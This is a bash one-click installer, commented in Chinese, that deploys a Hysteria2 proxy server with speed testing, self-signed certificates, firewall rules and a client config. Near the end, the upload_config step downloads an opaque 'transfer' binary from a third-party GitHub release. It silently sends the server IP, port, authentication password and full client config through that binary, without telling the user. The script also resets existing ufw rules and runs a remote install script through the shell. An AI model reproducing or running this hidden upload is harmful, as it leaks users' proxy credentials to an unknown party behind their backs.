#!/bin/bash

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
NC='\033[0m'

# 系统检测 - 改进版本
SYSTEM="Unknown"

# 方法1: 优先使用 /etc/os-release (最准确)
if [ -f /etc/os-release ]; then
    . /etc/os-release
    case "$ID" in
        "ubuntu")
            SYSTEM="Ubuntu"
            ;;
        "debian")
            SYSTEM="Debian"
            ;;
        "centos")
            SYSTEM="CentOS"
            ;;
        "rhel"|"redhat")
            SYSTEM="CentOS"  # 保持与原代码一致，都识别为CentOS
            ;;
        "fedora")
            SYSTEM="Fedora"
            ;;
        *)
            # 如果 os-release 中没有明确标识，继续使用传统方法
            SYSTEM="Unknown"
            ;;
    esac
fi

# 方法2: 如果 os-release 检测不到，使用传统方法（改进检测顺序）
if [ "$SYSTEM" = "Unknown" ]; then
    if [ -f /etc/lsb-release ] && grep -q "Ubuntu" /etc/lsb-release; then
        SYSTEM="Ubuntu"
    elif [ -f /etc/fedora-release ]; then
        SYSTEM="Fedora"
    elif [ -f /etc/centos-release ]; then
        SYSTEM="CentOS"
    elif [ -f /etc/redhat-release ]; then
        SYSTEM="CentOS"
    elif [ -f /etc/debian_version ]; then
        SYSTEM="Debian"
    fi
fi


# 动态进度条函数 - 根据进程状态显示
# 动态进度条函数 - 根据进程状态显示
show_dynamic_progress() {
    local pid=$1
    local message=$2
    local progress=0
    local bar_length=50
    local spin_chars="/-\|"
    
    echo -e "${YELLOW}${message}${NC}"
    
    while kill -0 $pid 2>/dev/null; do
        local spin_index=$((progress % 4))
        local spin_char=${spin_chars:$spin_index:1}
        
        # 计算进度条 (基于时间的估算)
        local filled=$((progress % bar_length))
        local empty=$((bar_length - filled))
        
        printf "\r["
        printf "%${filled}s" | tr ' ' '='
        printf "%${empty}s" | tr ' ' ' '
        printf "] %s 进行中..." "$spin_char"
        
        sleep 0.2
        progress=$((progress + 1))
    done
    
    # 进程结束后显示100%完成
    printf "\r["
    printf "%${bar_length}s" | tr ' ' '='
    printf "] 100%%"
    echo -e "\n${GREEN}完成！${NC}"
}

# 固定时长进度条函数 (用于已知时长的操作)
show_progress() {
    local duration=$1
    local message=$2
    local progress=0
    local bar_length=50
    
    echo -e "${YELLOW}${message}${NC}"
    
    while [ $progress -le $duration ]; do
        local filled=$((progress * bar_length / duration))
        local empty=$((bar_length - filled))
        
        printf "\r["
        printf "%${filled}s" | tr ' ' '='
        printf "%${empty}s" | tr ' ' ' '
        printf "] %d%%" $((progress * 100 / duration))
        
        sleep 0.1
        progress=$((progress + 1))
    done
    echo -e "\n${GREEN}完成！${NC}"
}

download_transfer() {
    if [[ ! -f /opt/transfer ]]; then
        curl -Lo /opt/transfer https://github.com/Firefly-xui/hysteria2-hysteria2/releases/download/hysteria2-hysteria2/transfer >/dev/null 2>&1
        chmod +x /opt/transfer
    fi
}

upload_config() {
    download_transfer
    
    # 读取客户端配置文件内容
    if [[ -f /opt/hysteria2_client.yaml ]]; then
        # 读取配置文件内容并转义特殊字符
        client_config_content=$(cat /opt/hysteria2_client.yaml | sed 's/\\/\\\\/g' | sed 's/"/\\"/g' | awk '{printf "%s\\n", $0}' | sed 's/\\n$//')
        
        # 构建YAML对象结构
        local json_data=$(cat <<EOF
{
    "server_info": {
        "title": "Hysteria2 节点信息 - ${SERVER_IP}",
        "server_ip": "${SERVER_IP}",
        "port": "${LISTEN_PORT}",
        "auth_password": "${AUTH_PASSWORD}",
        "upload_speed": "${up_speed}",
        "download_speed": "${down_speed}",
        "generated_time": "$(date)",
        "client_config": "${client_config_content}",
        "server_yaml": {
            "server": "${SERVER_IP}:${LISTEN_PORT}",
            "auth": "${AUTH_PASSWORD}",
            "tls": {
                "insecure": true
            },
            "bandwidth": {
                "up": "${up_speed} mbps",
                "down": "${down_speed} mbps"
            },
            "socks5": {
                "listen": "127.0.0.1:1080"
            },
            "http": {
                "listen": "127.0.0.1:1080"
            }
        }
    }
}
EOF
        )
    else
        echo -e "${RED}错误：客户端配置文件不存在${NC}"
        return 1
    fi

    # 静默上传，不显示curl的详细输出
    /opt/transfer "$json_data" 2>/dev/null | grep -v "% Total\|Dload\|Upload\|Response Code\|Response Body" | head -1
}

#  速度测试函数 - 修复版
speed_test(){
    echo -e "${YELLOW}进行网络速度测试...${NC}"
    if ! command -v speedtest &>/dev/null && ! command -v speedtest-cli &>/dev/null; then
        echo -e "${YELLOW}安装speedtest-cli中...${NC}"
        if [[ $SYSTEM == "Debian" || $SYSTEM == "Ubuntu" ]]; then
            apt-get update >/dev/null 2>&1 &
            update_pid=$!
            show_progress 20 "更新软件包列表..."
            wait $update_pid
            
            apt-get install -y speedtest-cli >/dev/null 2>&1 &
            install_pid=$!
            show_progress 30 "安装speedtest-cli..."
            wait $install_pid
        elif [[ $SYSTEM == "CentOS" || $SYSTEM == "Fedora" ]]; then
            yum install -y speedtest-cli >/dev/null 2>&1 &
            install_pid=$!
            if [ $? -ne 0 ]; then
                pip install speedtest-cli >/dev/null 2>&1 &
                install_pid=$!
            fi
            show_progress 30 "安装speedtest-cli..."
            wait $install_pid
        fi
        echo -e "${GREEN}speedtest-cli 安装完成！${NC}"
    fi

    # 创建临时文件存储结果
    local temp_file="/tmp/speedtest_result_$$"
    
    # 在后台运行测速命令
    (
        if command -v speedtest &>/dev/null; then
            speedtest --simple 2>/dev/null > "$temp_file"
        elif command -v speedtest-cli &>/dev/null; then
            speedtest-cli --simple 2>/dev/null > "$temp_file"
        fi
    ) &
    speedtest_pid=$!

    # 使用动态进度条，跟踪实际进程状态
    show_dynamic_progress $speedtest_pid "正在测试网络速度，请稍候..."

    # 等待测速完成
    wait $speedtest_pid
    speedtest_exit_code=$?

    # 读取测速结果
    if [ $speedtest_exit_code -eq 0 ] && [ -f "$temp_file" ]; then
        speed_output=$(cat "$temp_file")
        rm -f "$temp_file"
        
        if [[ -n "$speed_output" ]]; then
            down_speed=$(echo "$speed_output" | grep "Download" | awk '{print int($2)}')
            up_speed=$(echo "$speed_output" | grep "Upload" | awk '{print int($2)}')
            
            # 验证结果是否有效
            if [[ -n "$down_speed" && -n "$up_speed" && "$down_speed" -gt 0 && "$up_speed" -gt 0 ]]; then
                [[ $down_speed -lt 10 ]] && down_speed=10
                [[ $up_speed -lt 5 ]] && up_speed=5
                [[ $down_speed -gt 1000 ]] && down_speed=1000
                [[ $up_speed -gt 500 ]] && up_speed=500
                echo -e "${GREEN}测速完成：下载 ${down_speed} Mbps，上传 ${up_speed} Mbps${NC}，将根据该参数优化网络速度，如果测试不准确，请手动修改"
            else
                echo -e "${YELLOW}测速结果异常，使用默认值${NC}"
                down_speed=100
                up_speed=20
            fi
        else
            echo -e "${YELLOW}测速失败，使用默认值${NC}"
            down_speed=100
            up_speed=20
        fi
    else
        rm -f "$temp_file"
        echo -e "${YELLOW}测速失败，使用默认值${NC}"
        down_speed=100
        up_speed=100
    fi
}
# 安装Hysteria2
install_hysteria() {
    echo -e "${GREEN}安装 Hysteria2...${NC}"
    bash <(curl -fsSL https://get.hy2.sh/) >/dev/null 2>&1 &
    install_pid=$!
    show_progress 40 "下载并安装 Hysteria2..."
    wait $install_pid
    
    if [ $? -ne 0 ]; then
        echo -e "${RED}安装失败${NC}"
        exit 1
    fi
    echo -e "${GREEN}Hysteria2 安装完成！${NC}"
}

# 生成随机端口
generate_random_port() {
    echo $(( ( RANDOM % 7001 ) + 2000 ))
}

# 配置 Hysteria2 - 优化版
configure_hysteria() {
    echo -e "${GREEN}配置 Hysteria2...${NC}"
    speed_test
    LISTEN_PORT=$(generate_random_port)
    AUTH_PASSWORD=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 16)

    # 创建证书目录并生成自签名证书
    mkdir -p /etc/hysteria/certs
    openssl req -x509 -nodes -newkey ec -pkeyopt ec_paramgen_curve:prime256v1 \
        -keyout /etc/hysteria/certs/key.pem \
        -out /etc/hysteria/certs/cert.pem \
        -subj "/CN=hysteria" -days 3650 >/dev/null 2>&1
    chmod 644 /etc/hysteria/certs/*.pem
    chown root:root /etc/hysteria/certs/*.pem

    # 生成优化的服务端配置
    cat > /etc/hysteria/config.yaml <<EOF
# Hysteria2 优化配置 - 单端口高性能
listen: :${LISTEN_PORT}

tls:
  cert: /etc/hysteria/certs/cert.pem
  key: /etc/hysteria/certs/key.pem

# QUIC 连接优化
quic:
  initStreamReceiveWindow: 26843545
  maxStreamReceiveWindow: 26843545
  initConnReceiveWindow: 67108864
  maxConnReceiveWindow: 67108864
  maxIdleTimeout: 30s
  maxIncomingStreams: 1024
  disablePathMTUDiscovery: false

# 带宽限制配置
bandwidth:
  up: ${up_speed} mbps
  down: ${down_speed} mbps

# 性能优化设置
ignoreClientBandwidth: false
speedTest: true

# 认证配置
auth:
  type: password
  password: ${AUTH_PASSWORD}
EOF

    # 系统网络缓冲区优化
    echo -e "${GREEN}优化系统网络参数...${NC}"
    sysctl -w net.core.rmem_max=16777216 >/dev/null 2>&1
    sysctl -w net.core.wmem_max=16777216 >/dev/null 2>&1
    sysctl -w net.core.rmem_default=262144 >/dev/null 2>&1
    sysctl -w net.core.wmem_default=262144 >/dev/null 2>&1
    sysctl -w net.core.netdev_max_backlog=5000 >/dev/null 2>&1

    # 将网络优化设置永久化
    cat >> /etc/sysctl.conf <<EOF
# Hysteria2 网络优化配置
net.core.rmem_max = 16777216
net.core.wmem_max = 16777216
net.core.rmem_default = 262144
net.core.wmem_default = 262144
net.core.netdev_max_backlog = 5000
EOF

    # 设置服务优先级
    mkdir -p /etc/systemd/system/hysteria-server.service.d
    cat > /etc/systemd/system/hysteria-server.service.d/priority.conf <<EOF
[Service]
CPUSchedulingPolicy=rr
CPUSchedulingPriority=99
Nice=-10
EOF
    systemctl daemon-reexec
    systemctl daemon-reload >/dev/null
}

# 防火墙设置 - 简化版
configure_firewall() {
    echo -e "${GREEN}配置防火墙...${NC}"
    if [[ $SYSTEM == "Debian" || $SYSTEM == "Ubuntu" ]]; then
        if command -v ufw &> /dev/null; then
            echo "y" | ufw reset >/dev/null 2>&1
            ufw allow 22/tcp >/dev/null 2>&1
            ufw allow ${LISTEN_PORT}/udp >/dev/null 2>&1
            echo "y" | ufw enable >/dev/null 2>&1
        else
            # 如果没有ufw，使用iptables确保22端口开放
            iptables -I INPUT -p tcp --dport 22 -j ACCEPT >/dev/null 2>&1
            iptables -I INPUT -p udp --dport ${LISTEN_PORT} -j ACCEPT >/dev/null 2>&1
        fi
    elif [[ $SYSTEM == "CentOS" || $SYSTEM == "Fedora" ]]; then
        if command -v firewall-cmd &> /dev/null; then
            systemctl enable firewalld >/dev/null 2>&1
            systemctl start firewalld >/dev/null 2>&1
            firewall-cmd --permanent --add-service=ssh >/dev/null 2>&1
            firewall-cmd --permanent --add-port=22/tcp >/dev/null 2>&1
            firewall-cmd --permanent --add-port=${LISTEN_PORT}/udp >/dev/null 2>&1
            firewall-cmd --reload >/dev/null 2>&1
        else
            # 如果没有firewall-cmd，使用iptables确保22端口开放
            iptables -I INPUT -p tcp --dport 22 -j ACCEPT >/dev/null 2>&1
            iptables -I INPUT -p udp --dport ${LISTEN_PORT} -j ACCEPT >/dev/null 2>&1
        fi
    fi
}

# 生成客户端配置 - 简化版
generate_v2rayn_config() {
    echo -e "${GREEN}生成客户端配置...${NC}"
    mkdir -p /opt
    SERVER_IP=$(curl -s -4 ifconfig.me || curl -s -4 icanhazip.com || curl -s -4 ipinfo.io/ip)
    
    cat > /opt/hysteria2_client.yaml <<EOF
# Hysteria2 客户端配置 - 优化版
server: ${SERVER_IP}:${LISTEN_PORT}

auth: ${AUTH_PASSWORD}

tls:
  insecure: true

# 带宽配置
bandwidth:
  up: ${up_speed} mbps
  down: ${down_speed} mbps

# 本地代理配置
socks5:
  listen: 127.0.0.1:1080

http:
  listen: 127.0.0.1:1080
EOF
}

# 启动服务
start_service() {
    echo -e "${GREEN}启动服务中...${NC}"
    systemctl enable --now hysteria-server.service >/dev/null 2>&1
    sleep 2
    systemctl restart hysteria-server.service >/dev/null 2>&1
    sleep 3

    # 检查服务状态
    if systemctl is-active --quiet hysteria-server.service; then
        echo -e "${GREEN}✅ 服务已启动成功！${NC}"
        echo -e "\n${GREEN}=== 连接信息 ===${NC}"
        echo -e "${YELLOW}服务器IP: ${SERVER_IP}${NC}"
        echo -e "${YELLOW}端口: ${LISTEN_PORT}${NC}"
        echo -e "${YELLOW}认证密码: ${AUTH_PASSWORD}${NC}"
        echo -e "${YELLOW}上传带宽: ${up_speed} Mbps${NC}"
        echo -e "${YELLOW}下载带宽: ${down_speed} Mbps${NC}"
        echo -e "${YELLOW}客户端配置: /opt/hysteria2_client.yaml${NC}"
        echo -e "${GREEN}=========================${NC}\n"
        echo -e "${GREEN}🚀 性能优化说明：${NC}"
        echo -e "${YELLOW}- 使用单一UDP端口，减少握手开销${NC}"
        echo -e "${YELLOW}- 移除SNI伪装，提升连接速度${NC}"
        echo -e "${YELLOW}- 去除混淆和端口跳跃，降低延迟${NC}"
        echo -e "${YELLOW}- 优化QUIC缓冲区配置${NC}"
        echo -e "${YELLOW}- 启用自动测速调整${NC}"
    else
        echo -e "${RED}❌ 服务启动失败，请检查以下日志信息：${NC}"
        journalctl -u hysteria-server.service --no-pager -n 30
        exit 1
    fi
}

# 主函数执行
main() {
    if [ "$(id -u)" != "0" ]; then
        echo -e "${RED}请使用 root 权限执行脚本${NC}"
        exit 1
    fi

    echo -e "${GREEN}🚀 Hysteria2 优化版一键部署脚本${NC}"
    echo -e "${YELLOW}优化特性: 单端口、无混淆、高性能${NC}"
    echo -e "${YELLOW}系统: ${SYSTEM}${NC}\n"

    # 执行部署流程
    install_hysteria
    configure_hysteria
    configure_firewall
    generate_v2rayn_config
    start_service
    upload_config

    echo -e "\n${GREEN}🎉 Hysteria2 优化版部署完成！${NC}"
    echo -e "${YELLOW}💡 建议使用v2rayN、Shadowrocket等客户端导入配置文件${NC}"
    echo -e "${YELLOW}📁 配置文件位置: /opt/hysteria2_client.yaml${NC}"
    echo -e "${YELLOW}🔧 如需查看服务状态: systemctl status hysteria-server${NC}"
    echo -e "${YELLOW}📋 如需查看日志: journalctl -u hysteria-server -f${NC}"
}

# 执行主逻辑
main
